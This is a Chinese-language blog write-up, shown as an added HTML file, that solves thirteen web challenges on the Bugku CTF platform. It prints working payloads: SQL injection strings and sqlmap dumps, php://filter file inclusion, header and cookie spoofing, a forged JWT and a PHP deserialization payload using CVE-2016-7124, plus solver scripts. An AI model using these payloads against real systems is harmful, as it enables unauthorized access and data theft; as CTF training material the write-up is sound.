@@ -1,0 +1,605 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CTF 论剑场 Web1-13 WriteUp | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTF 论剑场 Web1-13 WriteUp | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="文章首发于安恒网络空间安全讲武堂
+
+平台地址：https://new.bugku.com/
+
+web1 simple bypass
+
+extract — 从数组中将变量导入到当前的符号表，trim — 去除字符串首尾处的空白字符（或者其他字..." />
+    <meta name="keywords" content="Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CTF 论剑场 Web1-13 WriteUp
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-04-25
+              </span>
+              <span>
+                12 min read
+              </span>
+              <span class="page-view" key="20190425205800" title="CTF 论剑场 Web1-13 WriteUp">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p><strong>文章首发于<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486357&amp;idx=1&amp;sn=df9932a0e456f3de8a344d040135a69c&amp;chksm=fbf791e5cc8018f3c03eae24e53f631ceb1b2eeefdd695ab7652032d44cf4c91cbb11dbc4c58&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1552640942&amp;ascene=7&amp;devicetype=android-27&amp;version=2700033b&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABAAjlx4AVpkeAMGZHgDRmR4AAAA%3D&amp;lang=zh_CN&amp;pass_ticket=P%2F37gdIywaM0N9Qk5Tattf%2FiDp493LUzzutPnqoulvtkArMTTfAac%2BKT6RPWIFwa&amp;wx_header=1">安恒网络空间安全讲武堂</a></strong></p>
+<blockquote>
+<p>平台地址：<a href="https://new.bugku.com/">https://new.bugku.com/</a></p>
+</blockquote>
+<h2 id="web1-simple-bypass">web1 simple bypass</h2>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551542788618-06d2b6ca-1a0f-4e81-be52-3a6131923bcd.png" alt="" loading="lazy"></figure>
+<p><strong>extract</strong> — 从数组中将变量导入到当前的符号表，<strong>trim</strong> — 去除字符串首尾处的空白字符（或者其他字符）。</p>
+<p>Payload:<code>a=&amp;b=</code>即可成功绕过，回显<code>flag{c3fd1661da5efb989c72b91f3c378759}</code>。</p>
+<h2 id="web2-quick-calc">web2 Quick calc</h2>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+请在三秒之内计算出以下式子，计算正确就的到flag哦！&lt;br/&gt;
+418*693117+32*(9976+2487)&lt;/p&gt;
+&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+计算结果:&lt;input type=&quot;text&quot; name=&quot;result&quot;/&gt;
+&lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-py">import re
+import requests
+
+url = 'http://123.206.31.85:10002/'
+r = requests.session()
+text = r.get(url).text
+calc = str(re.findall(&quot;(.*?)&lt;/p&gt;&quot;, text))[2:-2]
+ans = eval(calc)
+data = {'result':ans}
+res = r.post(url, data)
+print(res.text)
+</code></pre>
+<p>即可获得<code>flag{b37d6bdd7bb132c7c7f6072cd318697c}</code>。</p>
+<h2 id="web3-php伪协议">web3 php伪协议</h2>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551601290062-7fe40dd9-5f11-4bdb-83d7-45510e4d63ba.png" alt="" loading="lazy"></figure>
+<p>尝试上传<code>php</code>文件时回显<code>Sorry, only PNG files are allowed.</code>。</p>
+<p>判断为服务端白名单验证，这里参考<code>upload-labs</code>题解思路进行测试。</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551601844340-2598aaa1-71ac-4ae1-88b4-b023e390a8e7.png" alt="" loading="lazy"></figure>
+<p>测试无果,发现<code>url</code>的<code>op</code>参数首页为<code>op=home</code>上传页面为<code>op=upload</code>，猜测存在文件包含漏洞~</p>
+<p><code>op=1</code>回显：<code>Error no such page</code>。</p>
+<blockquote>
+<p>参考: <a href="https://lorexxar.cn/2016/09/14/php-wei/">php 伪协议</a></p>
+</blockquote>
+<p>使用php伪协议尝试传参：<code>?op=php://filter/read=convert.base64-encode/resource=flag</code>，回显<code>PD9waHAgCiRmbGFnPSJmbGFne2UwMGY4OTMxMDM3Y2JkYjI1ZjZiMWQ4MmRmZTU1NTJmfSI7IAo/Pgo=</code>。</p>
+<p>Base64 decode：</p>
+<pre><code class="language-php">&lt;?php 
+$flag=&quot;flag{e00f8931037cbdb25f6b1d82dfe5552f}&quot;; 
+?&gt;
+</code></pre>
+<h2 id="web4-万能密码">web4 万能密码</h2>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551617164817-353ffa97-27b8-4509-973d-0cc503b475b4.png" alt="" loading="lazy"></figure>
+<p>Payload: 万能密码, 注入点在password，<code>password=' or '1'='1</code>成功登陆。</p>
+<p>flag{7ae7de60f14eb3cbd9403a0c4328598d}</p>
+<h2 id="web5-injection">web5 injection</h2>
+<p>hint: injection</p>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551617377026-b8dac252-2847-46ce-82e6-00d9e2797a0a.png" alt="" loading="lazy"></figure>
+<pre><code class="language-sql">&gt; sqlmap -u &quot;http://47.95.208.167:10005/?mod=read&amp;id=1&quot; -p &quot;id&quot; -v 3
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: mod=read&amp;id=2 AND 6548=6548
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind
+    Payload: mod=read&amp;id=2 RLIKE SLEEP(5)
+    Vector: RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))
+
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: mod=read&amp;id=-1362 UNION ALL SELECT NULL,CONCAT(0x716b706b71,0x6b705a4550514d7864627845624c7252716d53456758474165446c66654e4a6b43714d776b767255,0x716b6a6b71),NULL,NULL-- vymr
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+[21:03:29] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL &gt;= 5.0.12
+
+...
+
+&gt; sqlmap -u &quot;http://47.95.208.167:10005/?mod=read&amp;id=1&quot; -p &quot;id&quot; -v 3 -D &quot;web5&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump
+
+Database: web5
+Table: flag
+[1 entry]
++----------------------------------------+
+| flag                                   |
++----------------------------------------+
+| flag{320dbb1c03cdaaf29d16f9d653c88bcb} |
++----------------------------------------+
+
+</code></pre>
+<h2 id="web6-xff-f12">web6 XFF、F12</h2>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551618812994-0b603a6f-4f92-4202-895e-e6802019c1f9.png" alt="" loading="lazy"></figure>
+<p>提交<code>user=admin' or '1'='1</code>、<code>pass=' or '1'='1</code>后回显：IP禁止访问，请联系本地管理员登陆，IP已被记录.</p>
+<p>猜想<code>X-Forward-For: 127.0.0.1</code>，这里通过Firefox插件X-Forwarded-For Header直接修改。</p>
+<p>提交<code>user=admin&amp;pass=admin</code>/<code>user=amdin&amp;pass=1</code>后回显：Invalid credentials! Please try again!</p>
+<p><strong>F12</strong>查看源代码在5023行：<code>&lt;!-- dGVzdDEyMw== --&gt;</code>。</p>
+<p>base64.decode后得到密码<code>test123</code>。</p>
+<p>登陆后回显：<code>The flag is: 85ff2ee4171396724bae20c0bd851f6b</code>.</p>
+<h2 id="web7-吃个小饼干吗">web7 吃个小饼干吗？</h2>
+<p>吃个小饼干吗？</p>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551619734707-686930cc-6c53-49f8-b228-cf0821b0dc66.png" alt="" loading="lazy"></figure>
+<p>注册测试用户后登陆，<code>home.php</code>页面如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551619974751-9fbf6c43-3a3d-4bfe-ada4-b057fb000c30.png" alt="" loading="lazy"></figure>
+<p>任意内容提交回显相同页面。</p>
+<p>想起小饼干的翻译是cookie，在报文中发现如下cookie字段:</p>
+<pre><code class="language-http">Set-Cookie: u=351e76680321232f297a57a5a743894a0e4a801fc3
+Set-Cookie: r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff
+# 规律如下
+Set-Cookie: u=351e766803 21232f297a57a5a743894a0e4a801fc3
+Set-Cookie: r=351e766803 d63c7ede8cb1e1c8db5e51c63fd47cff
+# md5(admin, 32) = 21232f297a57a5a743894a0e4a801fc3
+# d63c7ede8cb1e1c8db5e51c63fd47cff 解密明文为 limited
+</code></pre>
+<p>尝试cookie欺骗~</p>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551620792584-108d3bed-b625-480d-ad4b-2831a74ad4f0.png" alt="" loading="lazy"></figure>
+<h2 id="web8-simplesqli">web8 SimpleSQLI</h2>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551621020730-42582aa4-6221-4dfb-ba96-bd3f9fa449db.png" alt="" loading="lazy"></figure>
+<p>注册测试账户后，个人信息更新页面如下：</p>
+<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947568700-bd3044d2-2fd5-4a9d-b1c0-dbcba4945c34.png" alt="" loading="lazy"></figure>
+<p><code>dirsearch</code>下发现有<code>/.idea/workspace.xml</code>泄露以及<code>www.tar.gz</code>源码文件。</p>
+<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947763373-fdc204b3-3d33-4ebc-8262-66badae669e3.png" alt="" loading="lazy"></figure>
+<p>update.php中age处存在数字型注入点,payload如下：</p>
+<pre><code class="language-sql"># 直接回显
+(select group_concat(description) from (select description from users where username=0x61646d696e)x)
+# 逐位爆破(注意csrf-token的处理)
+0|conv(hex(substr((select description from (select * from users where username like 0x61646d696e)a),1,1)), 16, 10)
+conv(hex(substr((select description from (select * from users where username regexp 0x61646d696e limit 0,1)a),1,1)), 16, 10)
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948009156-5c838653-e51b-4fcf-9478-6f9c36dd9401.png" alt="" loading="lazy"></figure>
+<h2 id="web9-put-me-message">web9 PUT me message!</h2>
+<p>put me a message bugku then you can get the flag</p>
+<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947338584-12ce0c3b-56f5-44ac-8ee0-1dee87637fb9.png" alt="" loading="lazy"></figure>
+<p>Base64.decode-&gt;flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}.</p>
+<h2 id="web10-在线日记本">web10 在线日记本</h2>
+<p>hint:JWT你需要了解一哈.</p>
+<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948585023-a00d614d-957c-40e4-8339-14bbd7098a70.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948519660-cdd3f789-bfe0-4d0e-a255-0ed216ea6a3f.png" alt="" loading="lazy"></figure>
+<p>base32.decode(&quot;NNVTU23LGEZDG===&quot;)=kk:kk123,username=kk&amp;password=kk123提交登录。</p>
+<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551964938680-d46d6c0d-cb8f-4e31-964b-820ff7639840.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551965072453-479286a8-aca1-430a-a054-21b8d119ce66.png" alt="" loading="lazy"></figure>
+<p>下载<code>L3yx.php.swp</code>文件，通过<code>vi -r L3yx.php</code>:wq还原文件。</p>
+<pre><code class="language-php">&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
+&lt;title&gt;在线日记本&lt;/title&gt;
+&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+  &lt;p&gt;username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/p&gt;
+  &lt;p&gt;password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/p&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;
+&lt;/form&gt;
+&lt;!--hint:NNVTU23LGEZDG===--&gt;
+&lt;/html&gt;
+
+&lt;?php
+    error_reporting(0);
+    require_once 'src/JWT.php';
+
+    const KEY = 'L3yx----++++----';
+
+    function loginkk()
+    {
+        $time = time();
+        $token = [
+          'iss'=&gt;'L3yx',
+          'iat'=&gt;$time,
+          'exp'=&gt;$time+5,
+          'account'=&gt;'kk'
+        ];
+        $jwt = \Firebase\JWT\JWT::encode($token,KEY);
+        setcookie(&quot;token&quot;,$jwt);
+        header(&quot;location:user.php&quot;);
+    }
+
+    if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']!='' &amp;&amp; $_POST['password']!='')
+    {
+        if($_POST['username']=='kk' &amp;&amp; $_POST['password']=='kk123')
+        {
+            loginkk();
+        }
+        else
+        {
+            echo &quot;账号或密码错误&quot;;
+        }
+    }
+?&gt; 
+</code></pre>
+<blockquote>
+<p>JWT学习参考：<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程 - 阮一峰</a></p>
+</blockquote>
+<p>获取<code>Key='L3yx----++++----'</code>，使用<code>kk</code>账户登录得到：</p>
+<pre><code class="language-php"># Header.Payload.Signature
+token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTUxOTY1ODIxLCJleHAiOjE1NTE5NjU4MjYsImFjY291bnQiOiJrayJ9.ImnDWj4kYTxYyGfrOt-M0LCSwYSC8VtjdTfP03MLOyg
+# Header
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
+# Payload
+eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTUxOTY1ODIxLCJleHAiOjE1NTE5NjU4MjYsImFjY291bnQiOiJrayJ9.
+# Signature
+ImnDWj4kYTxYyGfrOt-M0LCSwYSC8VtjdTfP03MLOyg
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551966379732-44c7c202-628b-475e-9c9b-7f4e3e1c487b.png" alt="" loading="lazy"></figure>
+<p>更改account为L3yx,提前计算好iat和exp构造Token发包到user.php~</p>
+<ul>
+<li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551967336790-04658964-70ef-4afb-b598-d518bf5c8820.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551967241165-ef835703-dbac-4068-b62f-848dffa72797.png" alt="" loading="lazy"></figure>
+<h2 id="web11-md5截断比较">web11 MD5截断比较</h2>
+<pre><code class="language-html">&lt;html&gt;
+&lt;title&gt;robots&lt;/title&gt;
+&lt;body&gt;
+We han't anything!
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>访问<code>.robots</code>发现：Disallow: /shell.php，打开/shell.php.</p>
+<figure data-type="image" tabindex="22"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552203976235-47cbb07b-bf7e-4e1b-a80f-c4912ba0b5f6.png" alt="" loading="lazy"></figure>
+<p>可知为md5截断比较~ 每次刷新页面匹配值会改变，这里采用短时间生成大量MD5，牺牲空间来换取时间~</p>
+<pre><code class="language-python"># -*- coding: utf-8 -*-
+import hashlib
+sum = []
+j = 0
+f = open(&quot;gen_md5.txt&quot;, &quot;a&quot;)
+for i in xrange(1000000000):
+    tmp = (hashlib.md5(str(i)).hexdigest(),i)
+    sum.append(tmp)
+    j = j+1
+    if(j==10000000):
+        for i in sum:
+            f.write(&quot;{0} {1}&quot;.format(i,&quot;\n&quot;))
+        j=0
+        sum = []
+f.close()
+</code></pre>
+<p>执行命令正则匹配：<code>cat gen_md5.txt | grep \(\'str</code>检索符合的MD5~</p>
+<figure data-type="image" tabindex="23"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552206054283-b41ae692-04d1-4a19-a8aa-8cd17a0575e9.png" alt="" loading="lazy"></figure>
+<p>得到:flag{e2f86fb5f75da4999e6f4957d89aaca0}.</p>
+<h2 id="web12-unserialize">web12 unserialize</h2>
+<p>hint:时间好长啊</p>
+<figure data-type="image" tabindex="24"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552206455406-5a9f8909-4df0-44c7-922f-1cb8b307ae44.png" alt="" loading="lazy"></figure>
+<p>F12检查源代码发现注释掉的PHP代码：</p>
+<pre><code class="language-php">class Time{
+	public $flag = ******************;
+	public $truepassword = ******************;
+	public $time;
+	public $password ;
+	public function __construct($tt, $pp) {
+            $this-&gt;time = $tt;
+            $this-&gt;password = $pp;
+        }
+	function __destruct(){
+		if(!empty($this-&gt;password))
+		{
+			if(strcmp($this-&gt;password,$this-&gt;truepassword)==0){
+				echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;
+				if(!empty($this-&gt;time)){
+					if(!is_numeric($this-&gt;time)){
+						echo 'Sorry.&lt;br&gt;';
+						show_source(__FILE__);
+					}
+					else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66){
+						echo 'you need a bigger time.&lt;br&gt;';
+					}
+					else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11){
+						echo 'you need a smaller time.&lt;br&gt;';
+					}
+					else{
+						sleep((int)$this-&gt;time);
+						var_dump($this-&gt;flag);
+					}
+					echo '&lt;hr&gt;';
+				}
+				else{
+					echo '&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;';
+				}
+			}
+			else{
+				echo '&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;';
+			}
+		}
+		else{
+			echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;
+		}
+	}
+	function __wakeup(){
+		$this-&gt;password = 1; echo 'hello hacker,I have changed your password and time, rua!';
+	}
+}
+if(isset($_GET['rua'])){
+	$rua = $_GET['rua'];
+	@unserialize($rua);
+}
+else{
+	echo &quot;&lt;h1&gt;Please don't stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;;
+}
+
+</code></pre>
+<p>典型的<code>PHP反序列化题目</code>，可以参考：<a href="https://xz.aliyun.com/t/3674">PHP反序列化由浅入深</a>学习了解~</p>
+<p>简单审计思路：通过GET传值<code>rua</code>后进行反序列化, unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。__destruct()会在对象的所有引用都被删除或者当对象被显式销毁时执行，想要获取<code>flag</code>，我们需要<code>rua</code>满足一下条件：</p>
+<ul>
+<li>strcmp(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">this-&gt;password,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>this-&gt;truepassword)==0</li>
+<li>$this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66 &amp; $this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11</li>
+<li>sleep((int)$this-&gt;time)</li>
+</ul>
+<p>绕过方法:</p>
+<ul>
+<li>绕过__wakeup的执行(CVE-2016-7124):<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>，修改对象属性个数。</li>
+<li>绕过strcmp: Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0，构造password数组。</li>
+<li>绕过sleep(): (1)使用16进制表示<code>0x</code>开头，强制类型转化时会转化为<code>0</code>；(2)使用科学计数法绕过，<code>1.3E9</code>。</li>
+</ul>
+<figure data-type="image" tabindex="25"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552210443162-5ead5cb9-d080-4b2d-9930-4523f6b3d1c0.png" alt="" loading="lazy"></figure>
+<p>构造脚本：</p>
+<pre><code class="language-php">&lt;?php
+class Time{
+	public $time;
+	public $password;
+	public function __construct($tt, $pp) {
+            $this-&gt;time = $tt;
+            $this-&gt;password = $pp;
+    }
+}
+$array = array(
+    0 =&gt; &quot;bar&quot;,
+    1 =&gt; &quot;foo&quot;,
+);
+$time = '0x4d7c6d00';
+$rua = new Time($time, $array);
+echo serialize($rua);
+//O:4:&quot;Time&quot;:2:{s:4:&quot;time&quot;;s:10:&quot;0x4d7c6d00&quot;;s:8:&quot;password&quot;;a:2:{i:0;s:3:&quot;bar&quot;;i:1;s:3:&quot;foo&quot;;\}\}
+?&gt;
+</code></pre>
+<p>Payload:<code>rua=O:4:&quot;Time&quot;:3:{s:4:&quot;time&quot;;s:10:&quot;0x4d7c6d00&quot;;s:8:&quot;password&quot;;a:2:{i:0;s:3:&quot;bar&quot;;i:1;s:3:&quot;foo&quot;;\}\}</code>.</p>
+<figure data-type="image" tabindex="26"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552209742559-b1448e4b-0ab4-407b-8f5c-981e329b9eee.png" alt="" loading="lazy"></figure>
+<h2 id="web13-to-be-faster">web13 to be faster</h2>
+<figure data-type="image" tabindex="27"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552211162455-8fc677d8-2106-4a5d-80a9-5e2f933a7c82.png" alt="" loading="lazy"></figure>
+<p>用BurpSuite抓包分析如下:</p>
+<figure data-type="image" tabindex="28"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552211686579-15551a38-270c-4586-ab8d-155753597abb.png" alt="" loading="lazy"></figure>
+<p>在response Header头里发现了<code>Password</code>和<code>Hint</code>字段，base64解密<code>Password</code>后得到flag{f4970aacbacfba9e57ddbf998fa2e29d}，提交错误~</p>
+<p>Hint: Seeing is not believing, maybe you need to be faster!</p>
+<p>尝试将Password解密后flag{}里面包含的字段提交回显如下:</p>
+<figure data-type="image" tabindex="29"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552219442516-2fd466c3-8f40-4388-8cd2-983db0a869f8.png" alt="" loading="lazy"></figure>
+<p>推测需要先发送一个请求截取Password字段，然后base解密取flag{}内包含的值作为password的值发包，速度要快。</p>
+<p>Payload:</p>
+<pre><code class="language-python">import requests
+import base64
+url = 'http://123.xxx.xxx.85:10013/index.php'
+r = requests.session()
+r1 = r.post(url, data = {'password':'flag'})
+Password = r1.headers['Password']
+password = str(base64.b64decode(Password), 'utf-8')[5:-1]
+r2 = r.post(url, data = {'password':password})
+print(r2.text)
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552220059150-18b9cb9e-a1f6-4e18-b8cc-85725c7ea97f.png" alt="" loading="lazy"></figure>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#web1-simple-bypass">web1 simple bypass</a></li>
+<li><a href="#web2-quick-calc">web2 Quick calc</a></li>
+<li><a href="#web3-php%E4%BC%AA%E5%8D%8F%E8%AE%AE">web3 php伪协议</a></li>
+<li><a href="#web4-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">web4 万能密码</a></li>
+<li><a href="#web5-injection">web5 injection</a></li>
+<li><a href="#web6-xff-f12">web6 XFF、F12</a></li>
+<li><a href="#web7-%E5%90%83%E4%B8%AA%E5%B0%8F%E9%A5%BC%E5%B9%B2%E5%90%97">web7 吃个小饼干吗？</a></li>
+<li><a href="#web8-simplesqli">web8 SimpleSQLI</a></li>
+<li><a href="#web9-put-me-message">web9 PUT me message!</a></li>
+<li><a href="#web10-%E5%9C%A8%E7%BA%BF%E6%97%A5%E8%AE%B0%E6%9C%AC">web10 在线日记本</a></li>
+<li><a href="#web11-md5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83">web11 MD5截断比较</a></li>
+<li><a href="#web12-unserialize">web12 unserialize</a></li>
+<li><a href="#web13-to-be-faster">web13 to be faster</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-CTF-ljc-Web14-21-WriteUp/">
+                <h3 class="post-title" style="text-align: left;">
+                  CTF论剑场 Web14-21 WriteUp
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-SQLi-labs-Basic-Challenges-Less-1-22/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  SQLi-labs Basic Challenges
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
